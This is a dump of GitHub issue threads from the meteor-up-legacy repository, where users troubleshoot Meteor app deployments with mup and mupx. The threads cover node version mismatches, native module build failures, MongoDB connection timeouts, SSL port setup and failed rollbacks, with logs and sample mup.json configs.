With mupx the "docker host" gets a Mongo container installed during setup but it puts the database locally in /var/lib/mongodb which is linked into the Mongo container in /data/db it won't overwrite rerunning setup. When you deploy it will transfer the database itself. My point is its a bit unintuitive and important to understand in more complicated setups and perfect for what you suggested (1 DB for many meteor). 
You can add many servers in mup.json but I think they share one database currently, which can be overridden with different mongo_urls but those have to be deployed manually as far as I currently understand it. I'll try to reconfirm and report if found to function otherwise. You basically use multiple mup.json settings files to achieve multiple deployments but it takes some port and dns finessing.
Here is one example ...
https://forums.meteor.com/t/how-do-i-deploy-multiple-meteor-apps-to-the-same-digital-ocean-droplet-using-mupx-docker-and-using-multiple-domain-names/7289/4
</Body>
    </Comment>
    <Comment>
      <Owner>berkaey</Owner>
      <Body>yeah I use different ports and handle those with nginx in server side. but I don't need mongo because I use a remote db on compose. so you suggest even I don't use mongo should I install in on server?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Well using docker or even a kubernetes pod would provide better failure protection and scalability etc. But yes you can go more manual by disabling Mongo installation in mup.json and point to a database provider instance or what have you.
</Body>
    </Comment>
    <Comment>
      <Owner>berkaey</Owner>
      <Body>ok on my next project I will try to use mupx then :) just a quick question? can mupx deployment handle different versions of meteor and node in single server. I guess on some point mup doesn't handle this on every cases?   
</Body>
    </Comment>
    <Comment>
      <Owner>c9s</Owner>
      <Body>I forked this repo and started a new project from this basis,  the deploy script will fix the bcrypt issue automatically

You can just install the mup from here https://github.com/c9s/meteor-up
</Body>
    </Comment>
  </Issue_199>
  <Issue_200>
    <Repository>meteor-up-legacy</Repository>
    <Title>Meteor Up Not picking up changes deploying with old code </Title>
    <Owner>arunoda</Owner>
    <Body>I run meteor up deploy and had an error, I then removed a meteor package and made some changes to the code. Then did mup setup and mup deploy again it seems that it's not picking up the changes and new version? 
</Body>
    <State>open</State>
    <Comment>
      <Owner>cranesandcaff</Owner>
      <Body>I have this exact issue. It's weird and near impossible to reproduce reliably.

I do all of my work in meteor packages inside of the `packages` directory. 

If I'm working on `app:users-module` and I add some files or make changes within that and then I deploy it might choose to not push the updated package.

Sometimes however, if I do something like add a `console.log('why does mup hate me')` and deploy again it will now deploy the updated module. If I remove my `console.log` suddenly it's deploying the old code again. 

I have no idea why, what or how it's doing that. So far running `meteor reset` seems to fix it. So I assume it's something with picking up an old build? This is an issue in both mup and mupx.
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Some providers do distributed caching and that can lead to code lurking or at least last longer then desired. It also sounds like maybe your url is redirecting oddly maybe look at that localhost redirect or oposited. ? Very strange.
Fresh deployment targets come to mind to use whenever it happens but at first glace my instinct is to think this is possibly not a particularly mupy thing.
Posting your settings might reveal more insight? 
</Body>
    </Comment>
    <Comment>
      <Owner>cranesandcaff</Owner>
      <Body>I considered that, I'm deploying on Digital Ocean. I believe it's linked to packages, if I update two independent packages one of them might include my updates while the other will not.

I tried the fresh server approach and the issue persisted. I would set up a new droplet, run `mup setup` `mup deploy` and the old package code would be on the new server. 

Which settings would be helpful?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>And your sure it's not the database that's persisting instead of the code? A new instance would resolve that unless your Mongo is deployed differently.
</Body>
    </Comment>
    <Comment>
      <Owner>cranesandcaff</Owner>
      <Body>Definitely. 
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Maybe you need to be able to run meteor update from the target machine to pickup these packages you mentioned.
I'm also doing a similar development with everything in a sidecar package but have not tried deploying as you are.
It seems to me if you get everything right on your dev deployment system and use the standard mupx deploy from there it should be fine? 
But there can be problems in the build.
Maybe you need to try and manually step through the build (and/or deploy) phase to see what is really going wrong.
Are you using 
api.use
Or
Npm.require
Are the packages internal or loaded from a package manager? 
</Body>
    </Comment>
    <Comment>
      <Owner>cranesandcaff</Owner>
      <Body>They are internal through `api.use`, `api.addFile`
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>And you've tried mupx and rerunning 'mupx setup' and 'mupx deploy' again?
</Body>
    </Comment>
    <Comment>
      <Owner>cranesandcaff</Owner>
      <Body>I did. It's really hard to reproduce. There are a couple of weird things happening. 

It's persistent once it starts. That is, I can deploy fine multiple times but once it stops deploying the code no amount of running deploy will result in it deploying. 

It's selective based on which package changed. I added a controller and route to a module and added the link to my navigation. My navigation is in a different module than the controller and route. The link didn't appear in the navigation but I was able to enter the route directly. Other times the link would be in my navigation but it would be missing changes from other modules. 

I can force it, sometimes. I've had luck with something simple like adding a new line of code, a console log seems to work best but that could just be observer bias combined with it being my primary way to detect if the module deployed or not.

The weirdest is this though. Say I did get lucky and adding a `console.log('module updated')` resulted in that module being deployed. If I remove that console log it will revert to an earlier version of that module.

Running `meteor reset` and then `mup deploy` has so far fixed it every time I've tried.

I'm on Digital Ocean, using standard Ubuntu. I think it's a local issue though. How does mup build the deploy? Is it possible mup is caching individual modules and caching them? I'm not sure how that would be like recached when I remove the testing code though.

Honestly, at this point I'm willing to accept that the free tool I'm using is possessed. I have a workaround in resetting my local environment so it's far from the end of the world.

If you want to close this you can.
</Body>
    </Comment>
  </Issue_200>
  <Issue_201>
    <Repository>meteor-up-legacy</Repository>
    <Title>mup deploy failed</Title>
    <Owner>arunoda</Owner>
    <Body>x Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
b/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js" "rebuild" "--release"
gyp ERR! cwd /opt/testhi/tmp/bundle/programs/server/node_modules/fibers
gyp ERR! node -v v4.1.1
gyp ERR! node-gyp -v v3.0.3
gyp ERR! not ok 
Build failed
npm ERR! Linux 3.13.0-57-generic
npm ERR! argv "/opt/nodejs/bin/node" "/usr/bin/npm" "install"
npm ERR! node v4.1.1
npm ERR! npm  v2.14.4
npm ERR! code ELIFECYCLE

npm ERR! fibers@1.0.5 install: `node ./build.js`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the fibers@1.0.5 install script 'node ./build.js'.
npm ERR! This is most likely a problem with the fibers package,
npm ERR! not with npm itself.
npm ERR! Tell the author that this fails on your system:
npm ERR!     node ./build.js
npm ERR! You can get their info via:
npm ERR!     npm owner ls fibers
npm ERR! There is likely additional logging output above.

npm ERR! Please include the following file with any support request:
npm ERR!     /opt/testhi/tmp/bundle/programs/server/npm-debug.log
-----------------------------------STDOUT-----------------------------------
 &gt; ./bcrypt: npm install due to binary npm modules
bindings@1.0.0 node_modules/bindings

nodeunit@0.9.1 node_modules/nodeunit
&#9492;&#9472;&#9472; tap@0.7.1 (inherits@2.0.1, buffer-equal@0.0.1, deep-equal@1.0.1, slide@1.1.6, yamlish@0.0.7, nopt@3.0.4, mkdirp@0.5.1, difflet@0.2.6, glob@4.5.3, runforcover@0.0.2)

&gt; fibers@1.0.5 install /opt/testhi/tmp/bundle/programs/server/node_modules/fibers
&gt; node ./build.js

make: Entering directory `/opt/testhi/tmp/bundle/programs/server/node_modules/fibers/build'
  CXX(target) Release/obj.target/fibers/src/fibers.o
make: Leaving directory `/opt/testhi/tmp/bundle/programs/server/node_modules/fibers/build'
```

---

I got the above error when I attempted "mup deploy".
My "mup.json" file is configured as below. (I just deleted "host" and "password" for now. ) I'm using Node.js v 4.1.1 and Meteor 1.2.0.2 . And, I'm going to use local MongoDB, so I checked "setupMongo" as true. And I'm trying to deploy on D.O.
What should I do? please help me !

{
  // Server authentication info
  "servers": [
    {
      "host": "                  ",
      "username": "root",
      "password": "               "

```
}
```

  ],

  // Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": true,

  // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
  "setupNode": true,

  // WARNING: If nodeVersion omitted will setup 0.10.36 by default. Do not use v, only version number.
  "nodeVersion": "4.1.1",

  // Install PhantomJS in the server
  "setupPhantom": true,

  // Show a progress bar during the upload of the bundle to the server. 
  // Might cause an error in some rare cases if set to true, for instance in Shippable CI
  "enableUploadProgressBar": true,

  // Application name (No spaces)
  "appName": "testhi",

  // Location of app (local directory)
  "app": ".",

  // Configure environment
  "env": {
    "ROOT_URL": "http://testhi.com"
  },

  // Meteor Up checks if the app comes online just after the deployment
  // before mup checks that, it will wait for no. of seconds configured below
  "deployCheckWaitTime": 30
}
</Body>
    <State>open</State>
    <Comment>
      <Owner>lucfranken</Owner>
      <Body>As here: https://forums.meteor.com/t/mup-deploy-failed/11985 noted change the node version to 0.10.40 for meteor 1.2
</Body>
    </Comment>
  </Issue_201>
  <Issue_202>
    <Repository>meteor-up-legacy</Repository>
    <Title>mupx x Invoking deployment process: FAILED - Error response from daemon: no such id:</Title>
    <Owner>arunoda</Owner>
    <Body>i've got a brand new digital ocean droplet that i'm trying to deploy to which is throwing this error. `mupx setup` works fine, then `mupx deploy` chokes and throw this error:

```
x Invoking deployment process: FAILED

    -----------------------------------STDERR-----------------------------------
    Error response from daemon: no such id: myapp-frontend
    Error: failed to remove containers: [myapp-frontend]
    Error response from daemon: Cannot start container 8ee2840a7e64c60176838afe52e5fb94449e78e213de55550ccf505e2d2697d4: [8] System error: invalid argument
    -----------------------------------STDOUT-----------------------------------
    myapp
    base: Pulling from meteorhacks/meteord
    ef3dfc2694a4: Already exists
    a73c7fdae2e3: Already exists
    f55c06e43d45: Already exists
    e1ded6bbd435: Already exists
    4ccb6ad7cc45: Already exists
    4f80394a6bf4: Already exists
    644b344b6e8b: Already exists
    528baf8d4263: Already exists
    Digest: sha256:3c091d2a283b696266c3044f87d2cc8595f9ac837b2de7835cd1af0080aa5f44
    Status: Image is up to date for meteorhacks/meteord:base
    8ee2840a7e64c60176838afe52e5fb94449e78e213de55550ccf505e2d2697d4
    ----------------------------------------------------------------------------
```

i've been able to deploy another codebase to 4 other DO droplets successfully.  only difference with this project is that its only server code.  i did add a `/client` dir with a simple html file but that made no difference.

the app builds fine locally.
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>If you moved the line..
https://github.com/arunoda/meteor-up/blob/mupx/templates/linux/start.sh#L17

   set +e 

to before line 10 in the mupx start.sh
https://github.com/arunoda/meteor-up/blob/mupx/templates/linux/start.sh#L10

that might make it go?!
</Body>
    </Comment>
    <Comment>
      <Owner>mkpazon</Owner>
      <Body>Encountered this problem myself. I am using Vultr+Ubuntu. Realized that Apache server is running by default so I had to disable Apache to let Nginx do its job. I followed the disabling of Apache server [here](https://www.vultr.com/docs/setup-nginx-as-reverse-proxy-over-apache-on-debian-ubuntu). After disabling Apache everything seems to be working.
</Body>
    </Comment>
  </Issue_202>
  <Issue_203>
    <Repository>meteor-up-legacy</Repository>
    <Title>mupx support for external MongoDB Replica Set</Title>
    <Owner>arunoda</Owner>
    <Body>I definitely have the need to expose my MongoDB to other services as part of my solution but I notice in the docs that this is currently not supported. Is there an ETA for this? I have my own MongoDB replica set so can I call to that in the meantime?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>This is relevant... https://github.com/arunoda/meteor-up/issues/57

I believe it's more of a meteor issue. I suppose Galaxy is your hands free solution (still in Preview).
I'm thinking when AWS EFS also floats out of Preview, things will change or at least a solution (here or elsewhere) will materialize. It may take some time/releases still to sort this problem out. I figure 1 year is a safe guess on both Preview delays, and a couple of cycles to stabilize the mongo replica-set and meteor oplog system. I dream of a day multi-server writes is fully functional through a shared filesystem via oplog tailing/syncing on EFS etc. [I'm I dreaming or not?]

I think if your big enough and in Need sooner then both of those Previews are currently available/negotiable, or the expertise to get your system there will be available financially.
</Body>
    </Comment>
    <Comment>
      <Owner>occasl</Owner>
      <Body>I'm not sure I understand what you mean by "it's more of a meteor issue." With my current production deploying, I'm using my own MongoDB with replica sets and I reference that through the `MONGO_URL` environment variable. That works great!  

Similarly, could I just set the `MONGO_URL` as an environment variable in my `mup.json` to point to my existing MongoDB instance that I set up on another EC2 instance?  This way I could still use mupx for my AWS Meteor deployment and just leverage my own MongoDB installation.
</Body>
    </Comment>
    <Comment>
      <Owner>roeeyud</Owner>
      <Body>I'm having the same issue. 
It seems that changing MONGO_URL in mup.json doesn't change the MONGO_URL environment variable when the server runs. When I print out the MONGO_URL I see mongodb://mongodb:27017/&lt;app-name&gt;
</Body>
    </Comment>
    <Comment>
      <Owner>derwaldgeist</Owner>
      <Body>I'm a bit irritated by this issue. Where in the docs can I find the info that external replica sets are not supported? I just connected my mupx-based EC2 instance to a Compose.io replica set, and everything seems to work fine. Did I miss something?
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>From the link above last line it sums it up really with.
"For others there are many ways to setup replicas"
I think (what you missed) it's possibly particular to mup/mupx and managing multiple deployment machines or similar. Currently beyond it's capability or even as it's explained in the link #57 "its purpose".
A new version is forming at kadirahq current. I hope all your wishes have been heard and interpreted into what is surly a complex task.
In another thread just earlier there was this link to this meteor plugin for redis.
https://atmospherejs.com/slava/redis-livedata
so ya pick your poison.
This might be really nice on AWS EFS (Shared Filesystem op_log). Can't wait to try when it's out of Preview.

To add clarity to my words before. I explored the notion that with just oplog on a shared filesystem you don't need a master slave configuration. I have yet to try. When it's possible by the majority to launch on 5 machines via EFS it will become more possible that that (?-able) configuration becomes more &amp; more desirable. IMHO. Please discuss.
</Body>
    </Comment>
    <Comment>
      <Owner>derwaldgeist</Owner>
      <Body>Thanks for answering. Yet I have to admit I still don't get this issue and your explanation. I've seen #57, but in this issue Arunoda already refers to MongoHQ: 

&gt; I assume MongoHQ deal works for many.

So I interpreted #57 in a sense that replica sets are not supported to be installed by mupx, but are supported if you have set-up MongoDB yourself (or use a service like Compose.io) and point your mupx installed server to this replica set using Mongo URLs.

And at least for me, it seemed to work as expected. This is why I was asking myself why this issue is titled "mupx support for external MongoDB Replica Set"?
</Body>
    </Comment>
  </Issue_203>
  <Issue_204>
    <Repository>meteor-up-legacy</Repository>
    <Title>Node 0.10.40 is required by Meteor 1.2</Title>
    <Owner>arunoda</Owner>
    <Body>Meteor 1.2 apps can break if using node 0.10.36. Changing mup to use 0.10.40. Meteor 1.0-1.1 apps should experience no problems.
</Body>
    <State>open</State>
    <Comment>
      <Owner>timbrandin</Owner>
      <Body>I just modified the node version in mup.json and it works. 
</Body>
    </Comment>
  </Issue_204>
  <Issue_205>
    <Repository>meteor-up-legacy</Repository>
    <Title>accessing localhost</Title>
    <Owner>arunoda</Owner>
    <Body>My app uses a http service which I run at `localhost:8545` of the host instance. The deployed app can't access out of my deployed app. Do some extra options have to be provided to mup.json to enable the docker container to have access to localhost:8545?
</Body>
    <State>open</State>
    <Comment>
      <Owner>mhhf</Owner>
      <Body>Ok, as a workaround I used [this](http://stackoverflow.com/questions/24319662/from-inside-of-a-docker-container-how-do-i-connect-to-the-localhost-of-the-mach) to discover my host ip outside of the docker container (172.17.42.1) and use this instead of localhost. Still it would be handy to have access to it from env/settings.
</Body>
    </Comment>
  </Issue_205>
  <Issue_206>
    <Repository>meteor-up-legacy</Repository>
    <Title>How to run SSL on a different port</Title>
    <Owner>arunoda</Owner>
    <Body>Hi, so I am deploying my application on the ':81' port, but when I deploy using this configuration for the SSL...

```
"ssl": {
    "pem": "./ssl.pem",
    "backendPort": 81
  }
```

...the certificate works on the ':80' port or the homepage (where I am currenlty deploying another Meteor project), is there a way in which I can use the certificate on the '81' port or maybe on both? Thanks in advance!

For reference, this is my config:

```
{
  "servers": [
    {
      "host": "MYHOST",
      "username": "rootMYUSER,
      "password": "MYPSWWD"
    }
  ],

  // Install MongoDB in the server, does not destroy local MongoDB on future setup
  "setupMongo": false,

  // WARNING: Node.js is required! Only skip if you already have Node.js installed on server.
  "setupNode": true,

  // WARNING: If nodeVersion omitted will setup 0.10.36 by default. Do not use v, only version number.
  "nodeVersion": "0.10.40",

  // Install PhantomJS in the server
  "setupPhantom": true,

  // Application name (No spaces)
  "appName": "MYAPPSNAME",

  // Location of app (local directory)
  "app": "LOCATION",

  // Configure environment
  "env": {
    "PORT": 81,
    "ROOT_URL": "http://IPADDRESS:81",
    "MONGO_URL": "MONGOURL",
    "MONGO_OPLOG_URL": "MONGOOPLOGURL"
  },

  // Meteor Up checks if the app comes online just after the deployment
  // before mup checks that, it will wait for no. of seconds configured below
  "deployCheckWaitTime": 30

  "ssl": {
    "pem": "./ssl.pem",
    "backendPort": 81
  }
}
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Try leaving env's port at 80? or something different I think it will conflict otherwise.
</Body>
    </Comment>
    <Comment>
      <Owner>cosio55</Owner>
      <Body>This thing is that on port 80 I have another meteor project which is the homepage for my project, and on port 81 I am deploying the mobile application.
</Body>
    </Comment>
    <Comment>
      <Owner>mattlinares</Owner>
      <Body>+1 I am trying to have a different certificate for two apps on two separate subdomains on the same server which isn't working. Would love any tips. Will post more info later but maybe knows the trick anyway?
</Body>
    </Comment>
    <Comment>
      <Owner>cosio55</Owner>
      <Body>What I did @mattlinares was to use a Digital Ocean Droplet as a load balancer, and I added the SSL certificates and everything into that server.
</Body>
    </Comment>
    <Comment>
      <Owner>mattlinares</Owner>
      <Body>Thanks @cosio55 . So you used a different server to enable two certificates, etc.? Surely there's a way to do this on one server? I am following code.krister.ee/hosting-multiple-instances-of-meteor-on-digitalocean/ and this appears to be the final piece of the puzzle to run two apps on one server (it's just a test instance anyway - and it does require ssl for e.g. third party auth calls). Would double the cost if this can't be solved, seems inelegant! Thanks again..
</Body>
    </Comment>
    <Comment>
      <Owner>cosio55</Owner>
      <Body>@mattlinares  I used a server as a load balancer not just because of the SSL certificates, but also so that I can scale my app quickly, so in this load balancer I installed I think it was three certificates, and then I created different droplets for each of the subdomain. Also I think you will find this really interesting, as SSL is mostly now free thanks to letsencrypt you can find info here: https://forums.meteor.com/t/no-more-paying-for-ssl-certificates/14349/11 https://forums.meteor.com/t/setting-up-ssl-with-letsencrypt-and-meteorup/14457 

And also, that is a nice tutorial you found, definitely a good resource.
</Body>
    </Comment>
  </Issue_206>
  <Issue_207>
    <Repository>meteor-up-legacy</Repository>
    <Title>Undo / Backup function</Title>
    <Owner>arunoda</Owner>
    <Body>Is there a way to undo

```
mup deploy
```

if I get any errors? like saving a backup before?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>See this thread and please report back if you still have issues thanks.

```
https://github.com/arunoda/meteor-up/issues/478
```
</Body>
    </Comment>
    <Comment>
      <Owner>Obiwarn</Owner>
      <Body>um...not really.

I would like to return to my previous version, e.g. to have something like:

```
mup deploy last release
```

so I can test a new release. 
</Body>
    </Comment>
  </Issue_207>
  <Issue_208>
    <Repository>meteor-up-legacy</Repository>
    <Title>security issues</Title>
    <Owner>arunoda</Owner>
    <Body>is it possible that someone can use my collections without my approval with his own app or how is my mongoDB secured?

e.g.

I (`Person A`) have `meteor app A` on my server(`IP_A:PORT_A`) and on my mobile devices running. `Meteor app A` has a collection named `MyCollectionA`

what happens when `Person B` creates his own app and do a `meteor run ios-device --mobile-server=IP_A:PORT_A` and his app is also using a collection named `MyCollectionA`

can he read it?
</Body>
    <State>open</State>
    <Comment>
      <Owner>elie222</Owner>
      <Body>Only if he has access to your mongodb which would require a username and password.
</Body>
    </Comment>
  </Issue_208>
  <Issue_209>
    <Repository>meteor-up-legacy</Repository>
    <Title>Digital Ocean: mup deploy fails wait-for-mongo: failed to connect</Title>
    <Owner>arunoda</Owner>
    <Body>Suddenly, I'm getting this error when deploying a meteor app to my digital ocean UBUNTU 14.04 droplet:

```
~/s/h/d/deploy-project &#10095;&#10095;&#10095; DEBUG=* mup deploy

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Building Started: /Users/Name/srv/http/meteor/sample


Started TaskList: Deploy app 'sample' (linux)
[128.199.190.128] - Uploading bundle
  nodemiral:sess:128.199.190.128 copy file - src: /var/folders/q6/gppg73jj40gbgpsqt3pqqnl00000gn/T/20a33746-468a-4a9a-a976-e6b9414f8658/bundle.tar.gz, dest: /opt/sample/tmp/bundle.tar.gz, vars: undefined +0ms
[128.199.190.128] - Uploading bundle: SUCCESS
[128.199.190.128] - Setting up Environment Variables
  nodemiral:sess:128.199.190.128 copy file - src: /usr/local/lib/node_modules/mup/templates/linux/env.sh, dest: /opt/sample/config/env.sh, vars: {"env":{"ROOT_URL":"http://sample.arvi.io","PORT":3010,"METEOR_SETTINGS":"{\"public\":{}}","CLUSTER_ENDPOINT_URL":"http://128.199.190.128:3010"},"appName":"sample"} +3.4m
[128.199.190.128] - Setting up Environment Variables: SUCCESS
[128.199.190.128] - Invoking deployment process
[128.199.190.128] x Invoking deployment process: FAILED

    -----------------------------------STDERR-----------------------------------
    ules/node-gyp/lib/build.js:267:23)
    gyp ERR! stack     at ChildProcess.emit (events.js:98:17)
    gyp ERR! stack     at Process.ChildProcess._handle.onexit (child_process.js:820:12)
    gyp ERR! System Linux 3.13.0-52-generic
    gyp ERR! command "node" "/opt/nodejs/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js" "rebuild"
    gyp ERR! cwd /opt/sample/tmp/bundle/programs/server/npm/vsivsi_file-collection/node_modules/mongodb/node_modules/mongodb-core/node_modules/kerberos
    gyp ERR! node -v v0.10.36
    gyp ERR! node-gyp -v v1.0.1
    gyp ERR! not ok
    npm WARN package.json meteor-dev-bundle@0.0.0 No description
    npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
    npm WARN package.json meteor-dev-bundle@0.0.0 No README data

    /usr/lib/node_modules/wait-for-mongo/bin/wait-for-mongo:14
        throw err;
              ^
    Error: TIMEOUTED_WAIT_FOR_MONGO
        at null._onTimeout (/usr/lib/node_modules/wait-for-mongo/lib/waitForMongo.js:20:14)
        at Timer.listOnTimeout [as ontimeout] (timers.js:112:15)
    -----------------------------------STDOUT-----------------------------------
    .1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    wait-for-mongo: failed to connect to [127.0.0.1:27017]
    ----------------------------------------------------------------------------
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>It seems 
https://www.npmjs.com/package/wait-for-mongo
is failing to find mongo.
Is it possible to login via SSH and see if mongo is running?
via typing this in the app path or similar
    meteor mongo
another way...
http://docs.mongodb.org/master/tutorial/getting-started-with-the-mongo-shell/
</Body>
    </Comment>
    <Comment>
      <Owner>Lowellr</Owner>
      <Body>I am also having a problem deploying to a digital ocean UBUNTU 14.04 droplet: ( I've never been successful, so I might be missing something simple. I did login via SSH and mongo is not running. Any help would be appreciated. (I'm just learning).

## Meteor Up: Production Quality Meteor Deployments

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Building Started: .

Started TaskList: Deploy app 'simple-todos' (linux)
[104.131.129.37] - Uploading bundle
[104.131.129.37] - Uploading bundle: SUCCESS
[104.131.129.37] - Setting up Environment Variables
[104.131.129.37] - Setting up Environment Variables: SUCCESS
[104.131.129.37] - Invoking deployment process
[104.131.129.37] x Invoking deployment process: FAILED

```
-----------------------------------STDERR-----------------------------------
npm WARN package.json meteor-dev-bundle@0.0.0 No description
npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
npm WARN package.json meteor-dev-bundle@0.0.0 No README data
stop: Unknown instance: 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
```

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (7) Failed to connect to localhost port 80: Connection refused
    App did not pick up! Please check app logs.
    -----------------------------------STDOUT-----------------------------------
    de ./build.js

```
`linux-x64-v8-3.14` exists; testing
Binary is fine; exiting
ansi-regex@0.2.1 node_modules/ansi-regex

ansi-styles@1.1.0 node_modules/ansi-styles

escape-string-regexp@1.0.3 node_modules/escape-string-regexp

chalk@0.5.1 node_modules/chalk

strip-ansi@0.3.0 node_modules/strip-ansi

supports-color@0.2.0 node_modules/supports-color

has-ansi@0.1.0 node_modules/has-ansi

eachline@2.3.3 node_modules/eachline

type-of@2.0.1 node_modules/type-of

amdefine@1.0.0 node_modules/amdefine

asap@2.0.3 node_modules/asap

meteor-promise@0.4.8 node_modules/meteor-promise

underscore@1.5.2 node_modules/underscore

promise@7.0.4 node_modules/promise

source-map-support@0.3.2 node_modules/source-map-support

semver@4.1.0 node_modules/semver

source-map@0.1.32 node_modules/source-map

fibers@1.0.5 node_modules/fibers
Waiting for MongoDB to initialize. (5 minutes)
connected
simple-todos start/running, process 11244
Waiting for 60 seconds while app is booting up
Checking is app booted or not?
----------------------------------------------------------------------------
```
</Body>
    </Comment>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Try this long wait time in your settings.

```
"deployCheckWaitTime": 120
```

If people have problems with mup it's often suggested to try the development branch mupx version and see if that helps, otherwise of either of those ideas don't help please post your settings files. 
</Body>
    </Comment>
    <Comment>
      <Owner>katopz</Owner>
      <Body>@Lowellr In case you never success before, please try rebuild your droplet from scratch and follow my guide precisely it should work https://medium.com/@katopz/digital-ocean-meteor-bec33e75522d
</Body>
    </Comment>
  </Issue_209>
  <Issue_210>
    <Repository>meteor-up-legacy</Repository>
    <Title>mupx - failed verification doesn't roll back previous version</Title>
    <Owner>arunoda</Owner>
    <Body>Given the following:

```
Marks-MacBook-Air:app markshust$ mupx deploy

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Meteor app path    : /Users/markshust/Sites/app
Using buildOptions : {}

Started TaskList: Deploy app 'app' (linux)
[104.197.81.124] - Uploading bundle
[104.197.81.124] - Uploading bundle: SUCCESS
[104.197.81.124] - Sending environment variables
[104.197.81.124] - Sending environment variables: SUCCESS
[104.197.81.124] - Initializing start script
[104.197.81.124] - Initializing start script: SUCCESS
[104.197.81.124] - Invoking deployment process
[104.197.81.124] - Invoking deployment process: SUCCESS
[104.197.81.124] - Verifying deployment
[104.197.81.124] x Verifying deployment: FAILED

    -----------------------------------STDERR-----------------------------------
    eor app on port:80

    /bundle/bundle/programs/server/node_modules/fibers/future.js:245
                            throw(ex);
                                  ^
    TypeError: Cannot read property 'MAIL_URL' of undefined
        at app/server/startup/mail.js:2:49
        at /bundle/bundle/programs/server/boot.js:229:5
    npm WARN package.json meteor-dev-bundle@0.0.0 No description
    npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
    npm WARN package.json meteor-dev-bundle@0.0.0 No README data
    =&gt; Starting meteor app on port:80

    /bundle/bundle/programs/server/node_modules/fibers/future.js:245
                            throw(ex);
                                  ^
    TypeError: Cannot read property 'MAIL_URL' of undefined
        at app/server/startup/mail.js:2:49
        at /bundle/bundle/programs/server/boot.js:229:5
    npm WARN package.json meteor-dev-bundle@0.0.0 No description
    npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
    npm WARN package.json meteor-dev-bundle@0.0.0 No README data
    =&gt; Starting meteor app on port:80

    =&gt; Redeploying previous version of the app

    -----------------------------------STDOUT-----------------------------------

    To see more logs type 'mup logs --tail=50'

    ----------------------------------------------------------------------------
```

As you can see, I forgot to specify the settings.json file. If I specify, all is ok.

However, as you can see above, an err'd out deploy should redeploy previous version of app:
`Redeploying previous version of the app`

That said, this doesn't seem to be happening, as the site is crashed on production and not rolled back.
</Body>
    <State>open</State>
    <Comment>
      <Owner>markshust</Owner>
      <Body>This is still happening on the latest version of mupx. The `Redeploying previous version of the app` doesn't work. On a failed deploy, the previous version isn't redeployed -- the process just dies.
</Body>
    </Comment>
  </Issue_210>
  <Issue_211>
    <Repository>meteor-up-legacy</Repository>
    <Title>Deploy Fails</Title>
    <Owner>arunoda</Owner>
    <Body>Fresh install on Digital Ocean of Ubuntu 14.04 x64
Tried 12.07 and 4.0 versions of node

Have to manually apt-get install g++ and make in order for bcrypt.  Can't get past missing bindings file error for bcrypt.

MUP setup reports success
MUP deploy FAILs
</Body>
    <State>open</State>
    <Comment>
      <Owner>MasterJames</Owner>
      <Body>Please add a DEBUG *= mupx log to help understand where in the deploy code it errors, thanks.
Maybe post your settings files and version numbers as well.
</Body>
    </Comment>
    <Comment>
      <Owner>lookingcloudy</Owner>
      <Body>I created a new server using the default node version 0.10.36.  This worked just fine.  I'll note that I created this server using a different droplet size and in a different region than my original try.

I then changed `mup.json` node version 0.12.7.  `mup setup` was successful, but `mup deploy` BOMBED!   Here is the output from DEBUG=\* mup deploy

```
Started TaskList: Deploy app 'listory-demo' (linux)
    [45.55.70.95] - Uploading bundle
